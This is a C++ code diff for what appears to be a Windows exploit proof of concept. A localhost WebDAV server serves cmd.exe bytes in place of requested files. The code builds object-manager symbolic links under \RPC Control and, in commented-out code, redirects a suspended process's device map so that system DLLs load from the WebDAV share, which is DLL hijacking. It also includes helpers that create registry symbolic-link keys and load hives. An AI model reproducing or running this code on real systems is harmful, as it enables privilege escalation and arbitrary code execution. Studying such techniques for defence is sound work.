+         const static inline str LOCKS = R""""( <D:lockdiscovery/><D:ishidden>0</D:ishidden>
+				                                 <D:supportedlock>
+					                                <D:lockentry><D:lockscope><D:exclusive/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry>
+					                                <D:lockentry><D:lockscope><D:shared/></D:lockscope><D:locktype><D:write/></D:locktype></D:lockentry>
+				                              </D:supportedlock>)""""s;
+
+         static auto xmlContainer(string rooturl) {
+            return R""""(  <D:response><D:href>)"""" + rooturl + R""""(</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop><D:getcontenttype/><D:getlastmodified>Tue, 12 Oct 2021 20:38:18 GMT</D:getlastmodified>
+                        )"""" + LOCKS + R""""(
+                        <D:getetag/><D:displayname>/</D:displayname><D:getcontentlanguage/><D:getcontentlength>0</D:getcontentlength>
+                        <D:iscollection>1</D:iscollection><D:creationdate>2021-08-20T14:42:43.702Z</D:creationdate><D:resourcetype><D:collection/></D:resourcetype>
+                     </D:prop></D:propstat></D:response>)"""";
+         };
+         static auto xmlEntry(str rooturl, str filename, bool isdir) {
+            return R""""(  <D:response><D:href>)"""" + rooturl + filename + (isdir ? "/"s : ""s) + R""""(</D:href><D:propstat><D:status>HTTP/1.1 200 OK</D:status><D:prop>
+                        <D:getcontenttype>)"""" + (isdir ? ""s : "application/octet-stream"s) + R""""(</D:getcontenttype><D:getlastmodified>Fri, 20 Aug 2021 16:51:11 GMT</D:getlastmodified>)"""" + LOCKS + R""""(
+                        <D:getetag></D:getetag><D:displayname>)"""" + filename + R""""(</D:displayname><D:getcontentlanguage/><D:getcontentlength>5</D:getcontentlength>
+                        <D:iscollection>)"""" + (isdir ? "1"s : "0"s) + R""""(</D:iscollection><D:creationdate>2021-08-20T16:51:11.724Z</D:creationdate><D:resourcetype>)"""" + (isdir ? "<D:collection />"s : " "s) + R""""(</D:resourcetype>
+                     </D:prop></D:propstat></D:response>)"""";
+         };
+      public:
+         static auto makexml(str rooturl, direntries entries) {
+            auto xml = "<?xml version=\"1.0\" encoding=\"utf-8\"?><D:multistatus xmlns:D=\"DAV:\">"s + (entries.size() ? "" : xmlContainer(rooturl));
+            for (auto& f : entries) { xml = xml + xmlEntry(rooturl, f.filename, f.isDir); }
+            return xml + "</D:multistatus>"s;
+         }
+      };
+
+      shared_ptr< thread> dav{ new thread{ []() {
+          httpd d{ L"LOCALHOST", L"" , L"80", [&](request_response r) { try {
+             switch (r.requestVerb) {
+                case HttpVerbOPTIONS:
+                   r.setResponseHeader("MS-Author-Via", "DAV");
+                   r.setResponseHeader("X-Content-Type-Options", "nosniff");
+                   r.setResponseHeader(HttpHeaderAllow, "OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK");
+                   r.setResponseHeader("DAV", "1,2,3");
+                   r.setResponseHeader("Public", "OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK");
+                   r.sendResponse(200, {});
+                break;
+                
+                case HttpVerbPROPFIND:
+                {
+                   r.setResponseHeader(HttpHeaderContentType, "text/xml");
+                   auto y = (r.url.find(".") == string::npos) ? "" : r.url;
+                   auto f = xml::makexml(r.httphost, { {y} });
+                   r.sendResponse(200, { f.begin(),f.end() });
+                }
+                 /* 
+                   {
+                      if (r.url.find( FNAME ) != string::npos|| 1) {
+                         auto res = xml::makexml(r.httphost, { { wstr{FNAME}.c_str(),false} });
+                         r.sendResponse(200, { res.begin(), res.end() });
+                      }
+                      else {
+                         r.sendResponse(404, {   });
+                      }
+                   }
+                   if(0){
+                      direntries content;
+                   
+                      content.push_back({ string{ FNAME}, false });
+                      try {
+                         auto yy = "C:\\" + str{ r.url }.replaceSubstr("DAVWWWROOT", "");
+                         auto dircontent = filepath{ yy.c_str() }.enumDir("C:\\\\", true);
+                         for (auto& f : dircontent) { content.push_back(f);  cout << f.filename << endl; }
+                      }
+                      catch (...) {}
+                      auto res = xml::makexml(r.httphost, content);
+                      r.sendResponse((content.size() ? 200 : 404), {res.begin(), res.end()} );
+                   }*/
+                break;
+                case HttpVerbHEAD: case HttpVerbDELETE: case HttpVerbPROPPATCH: case HttpVerbLOCK: case HttpVerbMKCOL:
+                   r.setResponseHeader(HttpHeaderContentType, "text/xml");
+                   r.sendResponse(200, {});
+                break;
+                case HttpVerbPUT:
+                case HttpVerbGET:
+                   if( r.url.find("Config")==string::npos)
+                   {
+                      auto response = filepath{ "C:\\windows\\system32\\cmd.exe" }.readFile();
+                        r.setResponseHeader(HttpHeaderContentType, "application/octet-stream");
+                        r.setResponseHeader("Content-Disposition", "attachment; filename=\"" +  r.url + "\"");
+                        cout << "served " << r.url << " by webdav " << endl;
+                        r.sendResponse(200, { response.begin() ,response.end() } );
+                     }
+                   else {
+                      cout << "served " << r.url << " 404 " << endl;
+                      r.sendResponse(404, {   });
+                   }
+                  break;
+                  default:
+                     std::cout << "Unexspected verb" << std::endl;
+                     r.setResponseHeader(HttpHeaderContentType, "text/html");
+                     r.sendResponse(200, {} );
+               }
+            }
+            catch (abortError& e) { cout << e.what() << endl; }
+            catch (exception& e) { cout << e.what() << endl; }
+            catch (...) { cout << "unexspected error" << endl; } }};
+         } },[](thread* t) {
+            t->join(); } };
+   }
+}
+struct mirrordir {
+   wstr primaryPath;
+   NTObj <NtDirectoryObject> secondary;
+   NTObj <NtDirectoryObject>  primary;
+   vector< NTObj< NtSymbolicLinkObject > > forwarders;
+   mirrordir(filepath path) :
+      primaryPath{ ("\\RPC Control\\"s + path.replaceSubstr("\\\\","")) },
+      secondary{ NtDirectoryObject::make({.ObjectName = wstr{ ("\\RPC Control\\secondary"s + path.replaceSubstr("\\\\","")) }}, 0, 0) },
+      primary{ NtDirectoryObject::make({.ObjectName = primaryPath}, secondary.getHandle(), 0) }     {
+    /*  for (const auto& f : path.enumDir()) {
+         forwarders.emplace_back(
+            ntSymLink::make( { .RootDirectory = secondary.getHandle(), .ObjectName = wstr{  f.filename } },  (wstr{ L"\\global??\\"s + wstr{path.c_str()} +   f.filename }).getUni())
+         );
+      }*/
+   }
+  /* auto insert(wstr filename, wstr destination) {
+      return forwarders.emplace_back(
+         NtSymbolicLinkObject{ defaults{.target = destination , .RootDirectory = primary.getHandle(), .ObjectName = filename  } }
+      );
+   }*/
+};
+#if _DEBUGXX
+static const auto  orgCout = std::cout.rdbuf([]() {
+   static struct streamfwd : public std::streambuf {
+      virtual int_type overflow(int_type c = EOF) {
+         char str[]{ static_cast<char>(c), 0x00 }; OutputDebugStringA(str);
+         return std::char_traits< char >::int_type{ c };
+      }
+   } dbgout;
+   return &dbgout;
+   }());
+#endif
+using namespace process;
+using namespace NT::files;
+
+int main()
+try {
+   httpd::ready.waitForSignal();
+   NtSymbolicLinkObject sy{ defaults{.p = {.ObjectName = "\\rpc control\\oooooooooo" } , .target = "\\??\\wtf"} };
+ cout <<  sy.queryLinkTarget();
+ 
+   auto cmdFile = NtFile::make( { .ObjectName = "\\??\\c:\\666\\cmd.exe" , .DesiredAccess = (ACCESS::AXX_SYNCHRONIZE | ACCESS::AXX_MAXIMUM) } );
+   cmdFile.queryInformationFile<FILE_INFORMATION_CLASS::FileFullEaInformation>().EaName;
+   cout <<  cmdFile.readAllOfFile().asHex(true) <<endl;
+
+   for (auto& f : cmdFile.queryInformationDirectory< FILE_DIRECTORY_INFO_CLASS::FileIdBothDirectoryInformation >() ) {
+    cout << f.name << " " << f.info.FileId.QuadPart << endl;
+   }
+
+   auto cmdSection = NtSection::make({ .DesiredAccess = ACCESS::AXX_SECTION_ALL_ACCESS }, NULL, PAGE_EXECUTE_READ, SEC_IMAGE, cmdFile.getHandle());
+
+   for ( auto& c : NtDirectoryObject::make({ .ObjectName = wstr{L"\\RPC Control"} }).getChildren() ){
+      cout << c.first << " " << c.second << endl;
+   }
+ 
+   httpd::servedPayload.waitForSignal();
+ /*
+   mirrordir cdir{ filepath{"c:\\"} };
+   mirrordir windowsdir{ filepath{"c:\\windows\\"} };
+   mirrordir system32dir{ filepath{"c:\\windows\\system32\\"} };
+   cdir.insert(L"windows", windowsdir.primaryPath);
+   windowsdir.insert(L"system32", system32dir.primaryPath);
+   auto suspended = mprocess(L"c:\\windows\\hh.exe", L"", L"c:\\windows\\system32", true);
+   {
+      auto RPCControlDir = NtDirectoryObject::make({ .ObjectName = wstr{L"\\RPC Control"} });
+      for (const auto& f : filepath{ "C:\\windows\\system32" }.enumDir()) {
+         if (wstr{ f.filename.c_str() }.upperCase().ends_with(L".DLL")) {
+            system32dir.insert(f.filename, wstr{ L"\\device\\mup\\;WebDavRedirector\\localhost@8990\\davwwwroot\\windows\\system32\\"s + f.filename });
+         }
+      }
+
+      PROCESS_DEVICEMAP_INFORMATION DeviceMap{ RPCControlDir.getHandle() };
+      THROW_ON_ERR(NtSetInformationProcess(suspended.hProcess, ProcessDeviceMap, &DeviceMap, sizeof(DeviceMap)));
+      ResumeThread(suspended.hThread);
+      cout << "Waiting for served payload signal..." << endl;
+      httpd::servedPayload.waitForSignal();
+      cout << "got served payload signal..." << endl;
+   }*/
+   httpd::stoppedDllHijack.signalPulse();
+   
+}
+catch (abortError& ) { cout << "aborting execution" << endl; }
+catch (exception& e) { cout << e.what() << endl; }
+catch (...) { cout << "Unexspected error" << endl; }
+
+#ifdef rrrr
+
+namespace registry
+{
+
+   auto loadKey(strpath registry_destination, strpath hivefile)
+   {
+      OBJECT_ATTRIBUTES dest{
+        sizeof(OBJECT_ATTRIBUTES),
+        0,
+        registry_destination.asUNICODE_STRING(),
+        OBJ_CASE_INSENSITIVE,
+        NULL,
+        NULL
+      };
+
+      OBJECT_ATTRIBUTES src{
+        sizeof(OBJECT_ATTRIBUTES),
+        0,
+        hivefile.asUNICODE_STRING(),
+        OBJ_CASE_INSENSITIVE,
+        NULL,
+        NULL
+      };
+
+      HANDLE h;
+      /*
+         int c = 0;
+         while (true)
+         {
+            try{
+            THROW_IF_NTSTATUS_FAILED(NtLoadKeyEx(&dest, &src, c++, (HANDLE)0, (HANDLE)0, MAXIMUM_ALLOWED, &h, nullptr));
+            std::wcout << L"SUCCESS" << std::endl;
+            }
+            catch (wil::ResultException& e)
+            {
+               std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
+               std::wcout << e.what() << std::endl;
+            }
+         }*/
+      THROW_IF_NTSTATUS_FAILED(NtLoadKeyEx(&dest, &src, 0x10, (HANDLE)0, (HANDLE)0, MAXIMUM_ALLOWED, &h, nullptr));
+      std::wcout << L"Loaded " << hivefile << " to " << registry_destination << std::endl;
+
+      return handle::make(h);
+   }
+
+   void unloadKey(strpath registry_key)
+   {
+      OBJECT_ATTRIBUTES regKey{
+        sizeof(OBJECT_ATTRIBUTES),
+        0,
+        registry_key.asUNICODE_STRING(),
+        OBJ_CASE_INSENSITIVE,
+        NULL,
+        NULL
+      };
+
+      THROW_IF_NTSTATUS_FAILED(NtUnloadKey(&regKey));
+
+      std::wcout << L"unloaded " << registry_key << std::endl;
+   }
+
+   template< typename T = unistr >
+   struct regValType
+   {
+      T val;
+      ULONG type{};
+      regValType(T value, ULONG type = REG_SZ) :val{ value }, type{ type }{}
+      PVOID value() { return (PVOID)val.c_str(); }
+      auto len() { return val.length() * 2; }
+   };
+   template< typename T> regValType(T)->regValType<T>;
+
+   template< >
+   struct regValType<int> {
+      int val;
+      ULONG type{};
+      regValType(int value, ULONG type = REG_DWORD) :val{ value }, type{ type }{}
+      PVOID value() { return &val; }
+      ULONG len() {
+         return sizeof(val);
+      }
+   };
+
+   class regval
+   {
+      const handle hRregKey;
+      const unistr valName;
+
+   public:
+      regval(handle hRregKey, unistr valName) : hRregKey{ hRregKey }, valName{ valName } {}
+
+      template<typename T>
+      T operator= (T value)
+      {
+         auto v = regValType{ value };
+
+         THROW_IF_NTSTATUS_FAILED(NtSetValueKey(hRregKey, valName.asUNICODE_STRING(), 0, v.type, v.value(), static_cast<ULONG>(v.len())));
+         return value;
+      }
+
+      operator std::wstring() const
+      {
+         ULONG ulSize;
+         auto status = NtQueryValueKey(
+            hRregKey,
+            valName.asUNICODE_STRING(),
+            KeyValuePartialInformation,
+            NULL,
+            0,
+            &ulSize
+         );
+
+         if (status != STATUS_BUFFER_TOO_SMALL) { THROW_IF_NTSTATUS_FAILED(status); }
+
+         std::vector< char > valueBuf{ 0x00 };
+         valueBuf.resize(ulSize);
+         std::fill_n(&valueBuf[0], ulSize, 0x00);
+
+         PKEY_VALUE_PARTIAL_INFORMATION value = (PKEY_VALUE_PARTIAL_INFORMATION)&valueBuf[0];
+
+         THROW_IF_NTSTATUS_FAILED(
+            NtQueryValueKey(
+               hRregKey,
+               valName.asUNICODE_STRING(),
+               KeyValuePartialInformation,
+               value,
+               ulSize,
+               &ulSize
+            )
+         );
+
+         return { std::wstring{ (wchar_t*)&value->Data[0] , ((wchar_t*)&value->Data[0]) + ulSize } };
+      }
+
+      friend std::wostream& operator<<(std::wostream& os, const regval& me) { return  os << static_cast<std::wstring>(me); }
+   };
+#define REG_OPTION_PREDEF_HANDLE (0x01000000L)
+#define REG_PREDEF_HANDLE_MASK   (0x80000000L)
+   class regKey : public NTObj< regKey, &NtCreateKey >
+   {
+      ULONG disposition{ 0x00 };
+
+      auto  getHandl2e() {
+         return   getHandle();
+      }
+
+      template<typename T>
+      T regRoot(T t) { return t; }
+      template<>
+      strpath regRoot(strpath t) { return regpath{ t }; }
+
+      regKey(objattr o, bool volatilekey = true, ACCESS_MASK DesiredAccess = MAXIMUM_ALLOWED)
+         : NTObj< regKey, &NtCreateKey >
+      {
+          DesiredAccess,
+          o,
+          0,
+          nullptr,
+          REG_OPTION_OPEN_LINK | (volatilekey ? REG_OPTION_VOLATILE : REG_OPTION_NON_VOLATILE),
+          &disposition
+      } {}
+   public:
+      template<typename T = const wchar_t*>
+      regKey(handle h, T objName = L"", bool volatilekey = true, ACCESS_MASK DesiredAccess = MAXIMUM_ALLOWED)
+         : NTObj< regKey, &NtCreateKey >
+      {
+          DesiredAccess,
+          objattr{ h, regRoot(std::forward<T>(objName)), OBJ_OPENLINK | OBJ_OPENIF | OBJ_CASE_INSENSITIVE },
+          0,
+          nullptr,
+          REG_OPTION_PREDEF_HANDLE | REG_OPTION_OPEN_LINK | (volatilekey ? REG_OPTION_VOLATILE : REG_OPTION_NON_VOLATILE),
+          &disposition
+      } {}
+
+
+      void deleteKey() { THROW_IF_NTSTATUS_FAILED(NtDeleteKey(wrappedHandle)); }
+
+      void renameKey(strpath newName) { THROW_IF_NTSTATUS_FAILED(NtRenameKey(wrappedHandle, newName.asUNICODE_STRING())); }
+
+      auto operator[] (unistr valueName) { return regval{ wrappedHandle, valueName }; }
+
+      auto getSubKeys() {
+         std::array<wchar_t, MAX_PATH> achKey{ 0x0000 };
+         std::array<wchar_t, MAX_PATH> achClass{ 0x0000 };
+         DWORD    cchClassName = MAX_PATH;
+         DWORD    cSubKeys = 0;               // number of subkeys
+         DWORD    cbMaxSubKey;              // longest subkey size 
+         DWORD    cchMaxClass;
+         DWORD    cValues;              // number of values for key 
+         DWORD    cchMaxValue;          // longest value name 
+         DWORD    cbMaxValueData;       // longest value data 
+         DWORD    cbSecurityDescriptor; // size of security descriptor 
+         FILETIME ftLastWriteTime;      // last write time 
+         HKEY hKey = (HKEY) static_cast<HANDLE>(wrappedHandle);
+         auto retCode = RegQueryInfoKey(hKey,                    // key handle 
+            &achClass[0],                // buffer for class name 
+            &cchClassName,           // size of class string 
+            NULL,                    // reserved 
+            &cSubKeys,               // number of subkeys 
+            &cbMaxSubKey,            // longest subkey size 
+            &cchMaxClass,            // longest class string 
+            &cValues,                // number of values for this key 
+            &cchMaxValue,            // longest value name 
+            &cbMaxValueData,         // longest value data 
+            &cbSecurityDescriptor,   // security descriptor 
+            &ftLastWriteTime);       // last write time 
+         std::vector<std::wstring> vecKeys;
+         if (cSubKeys)
+         {
+            vecKeys.reserve(cSubKeys);
+            for (unsigned int i = 0; i < cSubKeys; ++i)
+            {
+               DWORD cbName = 255;
+               retCode = RegEnumKeyEx(hKey, i, &achKey[0], &cbName, NULL, NULL, NULL, &ftLastWriteTime);
+               if (retCode == ERROR_SUCCESS)
+               {
+                  vecKeys.push_back(&achKey[0]);
+               }
+            }
+         }
+         return vecKeys;
+      }
+   };
+
+   struct createRegLinkKey : public NTObj< createRegLinkKey, &NtCreateKey >
+   {
+
+      ULONG disposition{ 0x00 };
+
+      createRegLinkKey(handle handle, unistr relname = L"", bool volatilekey = true, ACCESS_MASK DesiredAccess = KEY_ALL_ACCESS)
+         : NTObj< createRegLinkKey, &NtCreateKey >{
+         DesiredAccess,
+         objattr{ handle, relname , OBJ_CASE_INSENSITIVE | OBJ_OPENLINK | OBJ_OPENIF },
+         0,
+         nullptr,
+            REG_OPTION_OPEN_LINK ,
+         &disposition
+      } {}
+
+      createRegLinkKey(unistr objName, bool volatilekey = true, ACCESS_MASK DesiredAccess = KEY_ALL_ACCESS)
+         : NTObj< createRegLinkKey, &NtCreateKey >{
+         DesiredAccess,
+         objattr{ 0, objName, OBJ_CASE_INSENSITIVE | OBJ_OPENLINK | OBJ_OPENIF},
+         0,
+         nullptr,
+          REG_OPTION_CREATE_LINK | REG_OPTION_OPEN_LINK | (volatilekey ? REG_OPTION_VOLATILE : REG_OPTION_NON_VOLATILE),
+         &disposition
+      } {}
+
+
+      createRegLinkKey(objattr  objName, bool volatilekey = false, ACCESS_MASK DesiredAccess = KEY_ALL_ACCESS)
+         : NTObj< createRegLinkKey, &NtCreateKey >{
+         DesiredAccess,
+           objName ,
+         0,
+         nullptr,
+         REG_OPTION_CREATE_LINK | REG_OPTION_OPEN_LINK | (volatilekey ? REG_OPTION_VOLATILE : REG_OPTION_NON_VOLATILE),
+         &disposition
+      } {}
+
+      template< typename T >
+      createRegLinkKey(T objName, bool volatilekey = true, ACCESS_MASK DesiredAccess = KEY_ALL_ACCESS)
+         : NTObj< createRegLinkKey, &NtCreateKey >{
+         DesiredAccess,
+         objattr { 0, objName, OBJ_CASE_INSENSITIVE },
+         0,
+         nullptr,
+         REG_OPTION_CREATE_LINK | (volatilekey ? REG_OPTION_VOLATILE : REG_OPTION_NON_VOLATILE),
+         &disposition
+      } {}
+
+      void renameKey(strpath newName) { THROW_IF_NTSTATUS_FAILED(NtRenameKey(wrappedHandle, newName.asUNICODE_STRING())); }
+
+      void deleteKey() { THROW_IF_NTSTATUS_FAILED(NtDeleteKey(wrappedHandle)); }
+
+      void setLinkDestination(strpath destination) {
+         regval{ wrappedHandle, L"SymbolicLinkValue" } = regValType{ destination, REG_LINK };
+      }
+
+      auto getLinkDestination() {
+         return static_cast<std::wstring>(regval{ wrappedHandle, L"SymbolicLinkValue" });
+      }
+
+   }; /*
+   void dumpRegRoots()
+   {
+      for(auto& rootKeyName :  regKey{ "" }.getSubKeys() )
+      {
+         try {
+            auto croot = regKey{ rootKeyName };
+            for (auto& keyName : croot.getSubKeys())
+            {
+               for (auto& k : regKey{ croot , keyName }.getSubKeys())
+               {
+                  try {
+
+                     regKey{  "\\registry\\"_p / rootKeyName /  "\\"_p / keyName /  "\\"_p / k };
+                     std::wcout << L"\t" << keyName << std::endl;
+                  }
+                  catch (...) { std::wcout << L"registry::regKey \\REGISTRY\\"s << rootKeyName << L" could not be opened" << std::endl; }
+               }
+            }
+         }
+         catch (...) { std::wcout << L"registry::regKey \\REGISTRY\\"s << rootKeyName << L" could not be opened" << std::endl; }
+      }
+   }*/
+
+#endif
